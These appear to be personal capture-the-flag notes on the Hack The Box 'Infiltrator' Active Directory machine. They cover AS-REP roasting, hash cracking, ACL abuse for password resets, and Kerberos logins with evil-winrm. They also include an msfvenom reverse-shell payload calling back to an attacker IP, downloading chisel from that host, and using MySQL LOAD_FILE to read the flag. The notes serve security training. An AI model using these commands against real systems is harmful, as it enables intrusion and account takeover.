![image 81.png](assets/Infiltrator/image%2081.png)
![image 1 48.png](assets/Infiltrator/image%201%2048.png)
  
Domain: infiltrator.htb
  
names on the website
![image 2 48.png](assets/Infiltrator/image%202%2048.png)
  
username anarchy to make user list
- ./username_anarchy -i <names.txt>
![image 3 42.png](assets/Infiltrator/image%203%2042.png)
  
GetNPUsers on the list to get naming scheme
![image 4 38.png](assets/Infiltrator/image%204%2038.png)
f.last
  
make user list
![image 5 37.png](assets/Infiltrator/image%205%2037.png)
  
GetNPUsers again to get hashes
![image 6 33.png](assets/Infiltrator/image%206%2033.png)
  
crack that hash
![image 7 32.png](assets/Infiltrator/image%207%2032.png)
  
l.clark:WAT?watismypass!
  
crackmapexec smb 10.10.11.31 -u 'l.clark' -p 'WAT?watismypass!' --users
- gets users (one with pass in desc)
![image 8 29.png](assets/Infiltrator/image%208%2029.png)
k.turner:MessengerApp@Pass!
  
l.clark has acess to these shares
![image 9 29.png](assets/Infiltrator/image%209%2029.png)
  
k.turner has access to these shares
![image 10 24.png](assets/Infiltrator/image%2010%2024.png)
- yikes
  
running crackmapexec with ‘WAT?watismypass!’ shows some password reuse
![image 11 23.png](assets/Infiltrator/image%2011%2023.png)
d.anderson:WAT?watismypass!
m.harris shows the message for both passwords so she might be unknown
  
![image 12 17.png](assets/Infiltrator/image%2012%2017.png)
d.anderson has GenericAll permissions over marketing digital
  
marketing digital contains e.rodriguez
![image 13 17.png](assets/Infiltrator/image%2013%2017.png)
  
were gonna get the TGT for d.anderson and give him full control over Marketing Digital, and use this full control to change e.rodriguez’s password
  
  
![](assets/Infiltrator/Screenshot_from_2024-10-22_15-41-43.png)
impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-ip 10.10.11.31
  
![](assets/Infiltrator/Screenshot_from_2024-10-22_15-42-12.png)
export KRB5CCNAME=d.anderson.ccache
  
![](assets/Infiltrator/Screenshot_from_2024-10-22_15-42-34.png)
  
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip 10.10.11.31
  
python3 bloodyAD/[bloodyAD.py](http://bloodyad.py/) --host 'dc01.infiltrator.htb' -d 'infiltrator.htb' -k -u 'D.anderson' -p 'WAT?watismypass!' set password 'E.rodriguez' 'ImSoAngry!'
![image 14 16.png](assets/Infiltrator/image%2014%2016.png)
  
python3 bloodyAD/[bloodyAD.py](http://bloodyad.py/) --host 'dc01.infiltrator.htb' -d 'infiltrator.htb' -u 'E.rodriguez' -p 'ImSoAngry!' -k add groupMember 'CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB' e.rodriguez
![image 15 14.png](assets/Infiltrator/image%2015%2014.png)
  
python3 bloodyAD/[bloodyAD.py](http://bloodyad.py/) --host 'dc01.infiltrator.htb' -d 'infiltrator.htb' -u 'E.rodriguez' -p 'ImSoAngry!' set password 'M.harris' 'ImAlsoAngry!'
![image 16 12.png](assets/Infiltrator/image%2016%2012.png)
  
now get m.harris’ TGT
![image 17 10.png](assets/Infiltrator/image%2017%2010.png)
impacket-getTGT infiltrator.htb/m.harris:'ImAlsoAngry!' -dc-ip 10.10.11.31
  
export it again
![image 18 9.png](assets/Infiltrator/image%2018%209.png)
export KRB5CCNAME=m.harris.ccache
  
login to evil-winrm
- KRB5CCNAME=m.harris.ccache evil-winrm -i dc01.infiltrator.htb -u 'm.harris' -r INFILTRATOR.HTB
![image 19 8.png](assets/Infiltrator/image%2019%208.png)
- the KDC doesn’t know who we are, add this info to /etc/krb5.conf
```C
[libdefaults]
    default_realm = INFILTRATOR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
[realms]
    INFILTRATOR.HTB = {
        kdc = dc01.infiltrator.htb
        admin_server = dc01.infiltrator.htb
    }
[domain_realm]
    .infiltrator.htb = INFILTRATOR.HTB
    infiltrator.htb = INFILTRATOR.HTB
```
  
now login with evil-winrm
- KRB5CCNAME=m.harris.ccache evil-winrm -i dc01.infiltrator.htb -u 'm.harris' -r INFILTRATOR.HTB
![image 20 7.png](assets/Infiltrator/image%2020%207.png)
![image 21 7.png](assets/Infiltrator/image%2021%207.png)
  
the domain has mysql
![image 22 6.png](assets/Infiltrator/image%2022%206.png)
  
run rhost=10.10.11.31 username=m.harris password=ImAlsoAngry! winrm::auth=kerberos domaincontrollerrhost=10.10.11.31 winrm::rhostname=dc01.infiltrator.htb domain=infiltrator.htb
  
to move to meterpreter, need to export the krb5.conf
- export KRB5_CONFIG=/path/to/your/krb5.conf
  
need to get creds for the SQL Server
- winpeas shows a my.ini in
    
    - C:\Program Files\Output Messenger Server\Plugins\Output\mysql\my.ini
    
    - this will have creds
    
the Output Messenger Server directory is owned by Administrators
![image 23 5.png](assets/Infiltrator/image%2023%205.png)
  
to get a meterpreter shell
- create a payload with msfvenom
    
    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.28 lport=5555 -f exe > reverse_tcp.exe
    
- download the exe to winrm shell
![image 24 4.png](assets/Infiltrator/image%2024%204.png)
set up a listener on metasploit
![image 25 4.png](assets/Infiltrator/image%2025%204.png)
- run the exe on the winrm shell
  
  
  
get chisel onto machine with
- iwr -uri [http://10.10.14.28:9000/chisel_windows.exe](http://10.10.14.28:9000/chisel_windows.exe) -OutFile chisel1.exe
  
once chisel is running do
proxychains mysql -h 127.0.0.1 -P 14406 —database=outputwall -uroot -pibWijteig5
  
once in the SQL server, do
- SELECT LOAD_FILE(’C:\\Users\\Administrator\\Desktop\\root.txt’) AS Result;